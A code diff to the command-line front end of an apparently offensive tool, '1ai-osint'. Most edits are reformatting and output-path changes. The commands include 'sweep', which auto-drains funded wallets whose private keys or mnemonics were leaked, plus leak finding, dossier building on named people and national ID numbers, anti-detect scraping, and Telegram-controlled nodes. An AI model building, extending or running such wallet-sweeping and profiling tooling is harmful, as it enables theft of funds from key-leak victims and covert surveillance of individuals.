@@ -247,8 +247,6 @@ def _run_zkit_tracking(result, zkit_salt: str):
     return result
 
 
-
-
 @app.command()
 def scan(
     target: str = typer.Argument(
@@ -262,7 +260,9 @@ def scan(
     ),
     ai: bool = typer.Option(False, "--ai", help="Enable AI analysis via orchestrator"),
     zkit: bool = typer.Option(False, "--zkit", help="Enable ZKIT identity tracking"),
-    cloak: bool = typer.Option(False, "--cloak", help="Enforce CloakBrowser for anti-detect scraping"),
+    cloak: bool = typer.Option(
+        False, "--cloak", help="Enforce CloakBrowser for anti-detect scraping"
+    ),
     zkit_salt: str = typer.Option(
         "", help="ZKIT salt for privacy-preserving identity hashing"
     ),
@@ -290,7 +290,7 @@ def scan(
     """
     from src.core.config import settings
     import os
-    
+
     if cloak:
         os.environ["FORCE_CLOAKBROWSER"] = "1"
 
@@ -421,6 +421,7 @@ def leak_finder(
         raise typer.Exit(1)
 
     import os
+
     coordinator = LeakFinderCoordinator(
         sources=source_list,
         github_token=github_token or os.getenv("GITHUB_TOKEN") or None,
@@ -465,7 +466,9 @@ def leak_finder(
 
 @app.command()
 def resolve(
-    input: str = typer.Argument(..., help="Identifier to resolve (email, username, phone, crypto address)"),
+    input: str = typer.Argument(
+        ..., help="Identifier to resolve (email, username, phone, crypto address)"
+    ),
     output: str = typer.Option("json", help="Output format: json, sarif, pdf"),
     ai: bool = typer.Option(False, help="Enable AI analysis"),
     sources: str = typer.Option("all", help="Comma-separated source names or 'all'"),
@@ -532,18 +535,22 @@ def resolve(
 
         # Group leaks by source
         for leak in all_leaks:
-            result["identities"].append({
-                "source": leak.source_name,
-                "url": leak.source_url,
-                "text_preview": leak.text[:200],
-            })
+            result["identities"].append(
+                {
+                    "source": leak.source_name,
+                    "url": leak.source_url,
+                    "text_preview": leak.text[:200],
+                }
+            )
 
         # Add extracted keys
         for key in all_keys:
-            result.setdefault("crypto_keys", []).append({
-                "type": key.key_type.value,
-                "addresses": key.derived_addresses,
-            })
+            result.setdefault("crypto_keys", []).append(
+                {
+                    "type": key.key_type.value,
+                    "addresses": key.derived_addresses,
+                }
+            )
 
         # Output
         if output == "json":
@@ -558,7 +565,9 @@ def resolve(
 
 @app.command()
 def monitor(
-    target: str = typer.Argument(..., help="Identifier to monitor (email, username, crypto address)"),
+    target: str = typer.Argument(
+        ..., help="Identifier to monitor (email, username, crypto address)"
+    ),
     interval: int = typer.Option(300, help="Check interval in seconds"),
     sources: str = typer.Option("all", help="Comma-separated source names or 'all'"),
     telegram: bool = typer.Option(False, help="Send alerts via Telegram"),
@@ -637,11 +646,17 @@ def monitor(
 
 @app.command()
 def sweep(
-    auto: bool = typer.Option(False, help="Auto-sweep all funded wallets from discovered keys"),
+    auto: bool = typer.Option(
+        False, help="Auto-sweep all funded wallets from discovered keys"
+    ),
     key: str = typer.Option(None, help="Specific private key to sweep"),
     mnemonic: str = typer.Option(None, help="Specific mnemonic to sweep"),
-    chain: str = typer.Option("all", help="Chain to sweep: all, ethereum, solana, bitcoin"),
-    dry_run: bool = typer.Option(False, help="Dry run — show what would be swept without executing"),
+    chain: str = typer.Option(
+        "all", help="Chain to sweep: all, ethereum, solana, bitcoin"
+    ),
+    dry_run: bool = typer.Option(
+        False, help="Dry run — show what would be swept without executing"
+    ),
 ):
     """Sweep funds from leaked wallets to destination addresses."""
 
@@ -654,7 +669,9 @@ def sweep(
         try:
             if mnemonic:
                 typer.echo(f"Sweeping mnemonic: {mnemonic[:20]}...")
-                result = await sweeper.sweep_from_mnemonic(mnemonic, chain=chain, dry_run=dry_run)
+                result = await sweeper.sweep_from_mnemonic(
+                    mnemonic, chain=chain, dry_run=dry_run
+                )
                 typer.echo(json.dumps(result, indent=2, default=str))
             elif key:
                 typer.echo(f"Sweeping key: {key[:10]}...")
@@ -663,7 +680,10 @@ def sweep(
             elif auto:
                 typer.echo("Auto-sweep: scanning for funded wallets...")
                 # Use leak finder to find keys, then sweep
-                from src.modules.crypto.leak_finder.coordinator import LeakFinderCoordinator
+                from src.modules.crypto.leak_finder.coordinator import (
+                    LeakFinderCoordinator,
+                )
+
                 coordinator = LeakFinderCoordinator()
                 await coordinator.start()
                 result = await coordinator.run_once()
@@ -684,6 +704,7 @@ def sweep(
 
 # --- Node / Master Commands ---
 
+
 @app.command()
 def node(
     action: str = typer.Argument(..., help="Action: start, status"),
@@ -695,14 +716,18 @@ def node(
 
     async def _run_node():
         import os
+
         token = os.getenv("TELEGRAM_BOT_TOKEN", "")
         chat_id = master_chat_id or os.getenv("MASTER_CHAT_ID", "")
 
         if not token or not chat_id:
-            typer.echo("Error: TELEGRAM_BOT_TOKEN and MASTER_CHAT_ID required", err=True)
+            typer.echo(
+                "Error: TELEGRAM_BOT_TOKEN and MASTER_CHAT_ID required", err=True
+            )
             raise typer.Exit(1)
 
         from src.modules.node.agent import NodeAgent
+
         agent = NodeAgent(
             node_id=node_id,
             telegram_token=token,
@@ -726,12 +751,15 @@ def node(
 @app.command()
 def master(
     action: str = typer.Argument(..., help="Action: start, status"),
-    allowed_chat_ids: str = typer.Option("", help="Comma-separated allowed Telegram chat IDs"),
+    allowed_chat_ids: str = typer.Option(
+        "", help="Comma-separated allowed Telegram chat IDs"
+    ),
 ):
     """Run as the master bot, controlling all nodes via Telegram."""
 
     async def _run_master():
         import os
+
         token = os.getenv("TELEGRAM_BOT_TOKEN", "")
 
         if not token:
@@ -745,6 +773,7 @@ def master(
                 chat_ids = [chat_id]
 
         from src.modules.node.master import MasterBot
+
         bot = MasterBot(telegram_token=token, allowed_chat_ids=chat_ids)
 
         if action == "start":
@@ -778,13 +807,22 @@ def report(
         effective_salt = ""
         results = []
         if module == "all":
-            for name in ("data_leaks", "people", "phone", "social_osint", "email_osint", "domain_recon"):
+            for name in (
+                "data_leaks",
+                "people",
+                "phone",
+                "social_osint",
+                "email_osint",
+                "domain_recon",
+            ):
                 mod = _get_module(name, effective_salt)
                 if mod:
                     try:
                         result = await mod.scan(target)
                         results.append(result)
-                        typer.echo(f"  {name}: {result.finding_count} findings", err=True)
+                        typer.echo(
+                            f"  {name}: {result.finding_count} findings", err=True
+                        )
                     except Exception as exc:
                         typer.echo(f"  {name}: error - {exc}", err=True)
         else:
@@ -797,9 +835,10 @@ def report(
         engine = ReportEngine()
         report_data = engine.from_scan_results(target, results)
 
+        os.makedirs("output", exist_ok=True)
         if output == "html":
             html = render_html(report_data)
-            outfile = f"report_{target.replace(' ', '_').replace('@', '_at_')}.html"
+            outfile = f"output/report_{target.replace(' ', '_').replace('@', '_at_')}.html"
             with open(outfile, "w") as f:
                 f.write(html)
             typer.echo(f"Report saved to: {outfile}", err=True)
@@ -811,8 +850,12 @@ def report(
 
 @app.command()
 def deep_scan(
-    target: str = typer.Argument(..., help="Target to investigate (name, email, username, phone, NIK)"),
-    report_format: str = typer.Option("html", "--format", "-f", help="Output format: html, json, stix"),
+    target: str = typer.Argument(
+        ..., help="Target to investigate (name, email, username, phone, NIK)"
+    ),
+    report_format: str = typer.Option(
+        "html", "--format", "-f", help="Output format: html, json, stix"
+    ),
     output_file: str = typer.Option("", "--output", "-o", help="Output file path"),
     max_iterations: int = typer.Option(5, help="Max recursive scan iterations"),
     timeout: int = typer.Option(30, help="Timeout per module in seconds"),
@@ -825,13 +868,21 @@ def deep_scan(
         "standard",
         "--profile",
         "-p",
-        help="Collection profile: fast, standard, deep, agency (see docs/INTEL_STANDARD.md)",
+        help="Collection profile: fast, standard, deep (see docs/INTEL_STANDARD.md)",
     ),
-    case_id: str = typer.Option("", "--case", help="Investigation case ID (persists under investigations/)"),
-    use_ai: bool = typer.Option(False, "--ai", help="Enhance BLUF with AI when API key configured"),
+    case_id: str = typer.Option(
+        "", "--case", help="Investigation case ID (persists under investigations/)"
+    ),
+    use_ai: bool = typer.Option(
+        False, "--ai", help="Enhance BLUF with AI when API key configured"
+    ),
     pdf: bool = typer.Option(False, "--pdf", help="Also write briefing PDF"),
-    budget: float = typer.Option(15.0, "--budget", help="Execution budget for external APIs (0 = unlimited)"),
-    cloak: bool = typer.Option(False, "--cloak", help="Enforce CloakBrowser for anti-detect scraping"),
+    budget: float = typer.Option(
+        15.0, "--budget", help="Execution budget for external APIs (0 = unlimited)"
+    ),
+    cloak: bool = typer.Option(
+        False, "--cloak", help="Enforce CloakBrowser for anti-detect scraping"
+    ),
 ):
     """Deep scan — recursive identity investigation across all modules."""
     from src.modules.deep_scan.engine import DeepScanEngine
@@ -842,9 +893,10 @@ def deep_scan(
 
     async def _deep_scan():
         import os
+
         if cloak:
             os.environ["FORCE_CLOAKBROWSER"] = "1"
-            
+
         profile_name = "fast" if fast else profile
         try:
             prof = resolve_scan_profile(profile_name)
@@ -868,10 +920,16 @@ def deep_scan(
         )
         result = await engine.scan(target)
 
-        typer.echo(f"Results: {result.identifier_count} identifiers, {result.finding_count} findings, {result.iterations} iterations, {result.duration_sec:.1f}s", err=True)
+        typer.echo(
+            f"Results: {result.identifier_count} identifiers, {result.finding_count} findings, {result.iterations} iterations, {result.duration_sec:.1f}s",
+            err=True,
+        )
 
         intel = generate_intel_report_with_ai(result, use_ai=use_ai)
-        typer.echo(f"Intel report: {len(intel.evidence)} evidence, risk={intel.risk.level.value}", err=True)
+        typer.echo(
+            f"Intel report: {len(intel.evidence)} evidence, risk={intel.risk.level.value}",
+            err=True,
+        )
 
         if case_id:
             prev = CaseManager().load_previous_intel(case_id)
@@ -879,14 +937,19 @@ def deep_scan(
                 from src.modules.deep_scan.delta_briefing import compute_intel_delta
                 import json as _json
 
-                delta = compute_intel_delta(prev, _json.loads(export_report(intel, fmt="json")))
+                delta = compute_intel_delta(
+                    prev, _json.loads(export_report(intel, fmt="json"))
+                )
                 typer.echo(
                     f"Delta vs prior run: +{delta['new_evidence_count']} evidence, "
                     f"+{len(delta['new_emails'])} emails, breach Δ{delta['breach_delta']}",
                     err=True,
                 )
 
-        base = output_file or f"deep_scan_{target.replace(' ', '_').replace('@', '_at_')}"
+        os.makedirs("output", exist_ok=True)
+        base = (
+            output_file or f"output/deep_scan_{target.replace(' ', '_').replace('@', '_at_')}"
+        )
         for ext in (".html", ".json", ".stix"):
             if base.lower().endswith(ext):
                 base = base[: -len(ext)]
@@ -900,23 +963,25 @@ def deep_scan(
             f.write(json_body)
         typer.echo(f"HTML report: {html_path}", err=True)
         typer.echo(f"JSON report: {json_path}", err=True)
-        
+
         # Compile dossier
         from src.modules.deep_scan.dossier_compiler import DossierCompiler
+
         all_findings = []
         for sr in result.scan_results:
             all_findings.extend(sr.findings)
-        
+
         result.dossier = DossierCompiler().compile(
             target,
             social_findings=[f for f in all_findings if f.module == "social_osint"],
-            deep_scan_result=result
+            deep_scan_result=result,
         )
 
-        if hasattr(result, 'dossier') and result.dossier:
+        if hasattr(result, "dossier") and result.dossier:
             dossier_html_path = f"{base}_dossier.html"
             dossier_json_path = f"{base}_dossier.json"
             from src.modules.deep_scan.exports.dossier_html import export_dossier_html
+
             with open(dossier_html_path, "w") as f:
                 f.write(export_dossier_html(result.dossier))
             with open(dossier_json_path, "w") as f:
@@ -966,9 +1031,13 @@ def report_from_file(
     with open(report_file) as f:
         report_data = engine.parse_report_json(f.read())
 
+    os.makedirs("output", exist_ok=True)
     if output == "html":
         html = render_html(report_data)
         outfile = report_file.replace(".json", ".html")
+        if not outfile.startswith("output/"):
+            import os
+            outfile = os.path.join("output", os.path.basename(outfile))
         with open(outfile, "w") as f:
             f.write(html)
         typer.echo(f"Report saved to: {outfile}")
@@ -976,13 +1045,19 @@ def report_from_file(
         typer.echo(json.dumps(report_data.to_dict(), indent=2, default=str))
 
 
-@app.command()
-def deep_scan(
-    target: str = typer.Argument(..., help="Target identifier (Name, Username, Email, Phone, Domain)"),
+@app.command(name="zkit-deep-scan")
+def zkit_deep_scan(
+    target: str = typer.Argument(
+        ..., help="Target identifier (Name, Username, Email, Phone, Domain)"
+    ),
     max_iterations: int = typer.Option(5, help="Maximum recursive search depth"),
-    fast: bool = typer.Option(False, "--fast", help="Use fast profile mode (lower timeouts, fewer handles)"),
+    fast: bool = typer.Option(
+        False, "--fast", help="Use fast profile mode (lower timeouts, fewer handles)"
+    ),
     output: str = typer.Option("json", help="Output format: json, html"),
-    zkit_salt: str = typer.Option("", help="Optional fixed ZKIT salt for stable output"),
+    zkit_salt: str = typer.Option(
+        "", help="Optional fixed ZKIT salt for stable output"
+    ),
 ):
     """Run a recursive Deep Scan on an identity target, using the ZKIT Engine."""
     from rich.console import Console
@@ -990,15 +1065,20 @@ def deep_scan(
     from rich.panel import Panel
     from rich.progress import Progress, SpinnerColumn, TextColumn
     from src.modules.deep_scan.engine import DeepScanEngine
-    
+
     console = Console()
-    console.print(Panel(f"[bold cyan]1ai-osint Deep Scan[/bold cyan]\nTarget: [bold yellow]{target}[/bold yellow]", border_style="cyan"))
+    console.print(
+        Panel(
+            f"[bold cyan]1ai-osint Deep Scan[/bold cyan]\nTarget: [bold yellow]{target}[/bold yellow]",
+            border_style="cyan",
+        )
+    )
 
     engine = DeepScanEngine(
         max_iterations=max_iterations,
         fast=fast,
     )
-    
+
     # We run it manually inside the async loop with Rich Progress
     async def _run_deep_scan():
         with Progress(
@@ -1008,16 +1088,20 @@ def deep_scan(
             transient=True,
         ) as progress:
             task_id = progress.add_task(f"Running deep scan on {target}...", total=None)
-            
+
             # The engine already does internal logging, but the progress bar looks nice.
             try:
                 result = await engine.scan(target)
-                progress.update(task_id, description="[bold green]Scan complete![/bold green]")
+                progress.update(
+                    task_id, description="[bold green]Scan complete![/bold green]"
+                )
                 return result
             except Exception as e:
-                progress.update(task_id, description=f"[bold red]Scan failed: {e}[/bold red]")
+                progress.update(
+                    task_id, description=f"[bold red]Scan failed: {e}[/bold red]"
+                )
                 raise
-                
+
     try:
         result = asyncio.run(_run_deep_scan())
     except Exception:
@@ -1033,26 +1117,29 @@ def deep_scan(
         verified = f.raw_data.get("verified")
         ver_text = "Yes" if verified is True else ("No" if verified is False else "-")
         table.add_row(f.module, f.title[:50], ver_text)
-        
+
     console.print(table)
-    
+
     # Output the full result to a file
     import json
+
     if output == "json":
-        outfile = f"deep_scan_{target.replace(' ', '_')}.json"
+        outfile = f"output/deep_scan_{target.replace(' ', '_')}.json"
         with open(outfile, "w") as f:
             json.dump(result.to_dict(), f, indent=2, default=str)
         console.print(f"Full JSON report saved to: [bold]{outfile}[/bold]")
     elif output == "html":
         from src.modules.report_engine import ReportEngine
         from src.modules.report_engine.html_template import render_html
+
         rep_engine = ReportEngine()
         report_data = rep_engine.from_deep_scan(result)
         html = render_html(report_data)
-        outfile = f"deep_scan_{target.replace(' ', '_')}.html"
+        outfile = f"output/deep_scan_{target.replace(' ', '_')}.html"
         with open(outfile, "w") as f:
             f.write(html)
         console.print(f"HTML report saved to: [bold]{outfile}[/bold]")
+
 
 if __name__ == "__main__":
     app()
